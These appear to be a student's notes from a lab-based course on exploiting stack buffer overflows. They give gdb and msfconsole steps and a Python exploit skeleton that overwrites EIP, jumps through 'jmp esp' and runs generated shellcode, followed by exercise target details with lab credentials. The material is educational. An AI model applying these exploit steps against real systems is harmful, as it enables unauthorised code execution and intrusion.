
Buffer Overflow:
    When you write outside the bounds of a designated unit of memory to crash the buffer and input your own malicious code.


heap:
    allocated and deallocated as needed
    
stack:
    used for passing info to other functions
    
registers:
    basic unit of storage in the cpu. Where the magic happens.

defenses against buffer overflow:
    non-executable stack:
        no executable code is allowed on the stack.
    ASLR (address space layour randomization):
        randomize the addresses of the memory locations on the stack.
    DEP (Data execution prevention):
        Just don't let data execute
    Canary
        Puts values in the code, if they are overwritten, the program stops.
        

gdb func
    opens func in gdb
disass main
    disassemble the main function

PERFORM OPEN SOURCE RESEARCH TO FIND VULNERABLE FUNCTIONS IN THE PROGRAM.

run
    runs the program.
    
https://wiremask.eu/tools/buffer-overflow-pattern-generator/
**wiremask looks pretty cool in general??**

python script for exploit:

    #!/usr/bin/python3
    buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'
    EIP = "BBBB"
    nop = '/x90' * 5
    print(buffer + EIP + nop)




go back into gdb:

run <<< <exploit name>

Now find the EIP value
looks something like:
    EIP: 0x31634130 ('0Ac1')
    (this should show an offset of 62)

put that value back into wiremask and it'll tell you the offset.

Now do the same thing with a payload of the length of the offset you just found to verify.
New EIP should be what you set EIP to in the script.

env - gdb func
show env
    *see environmental variables
unset env LINES
unset env COLUMNS
    *unset varuables so it can work

**crash the program again

info proc map
    * shows memory values
find /b <first after heap>, <bottom of the stack>, 0xff, 0xe4
    * the first address after heap to the bottom of the stack
    * finds jump esp
    
copy about 5 or 6 of the addresses out.

Now make one of those memory addresses your eip value in the script.
    **This is a step where you can try different addresses to troubleshoot.
    
msfconsole
use payload /linux/x86/exec
set CMD whoami
show options
generate -b "\x00" -f python

take the python code that was just generated by msfconsole and put it in the script.
Don't forget to add it to the print statement.

****MAKE SURE SLASHES ARE GOING THE RIGHT WAY!!!!****

Now I can run:
sudo ./func <<< $(python lin_buf.py)
to run the buffer overflow.

================strcpy IS A VULNERABLE FUNCTION=====================
Look up others.







ACTIVITY NOTES:

Scheme of Maneuver:

>Jump Box
->T1: 192.168.28.111
->T2: 192.168.28.105

>Jump Box
->donovian_grey_host
-->T3: 192.168.150.245


Target Section:

T1
Hostname: Donovian_Webserver
IP: 192.168.28.111
OS: CentOS
Creds: comrade :: StudentWebExploitPassword
Last Known SSH Port: 2222
Action: Exploit binary.

T2
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: unknown
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222

T3
Hostname: unknown
IP: 192.168.150.245
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Exploit a network service on the machine



Windows exploit 1:
Launch your remote exploit at the Donovian Windows target on 192.168.150.245 to gain initial access. Your flag is within the public documents .


linux ELF 2 Canary Bypass:

0x0000000000400760  __stack_chk_fail@plt

Dump of assembler code for function __stack_chk_fail@plt:
   0x0000000000400760 <+0>:     jmpq   *0x2008ca(%rip)        # 0x601030
   0x0000000000400766 <+6>:     pushq  $0x3
   0x000000000040076b <+11>:    jmpq   0x400720




















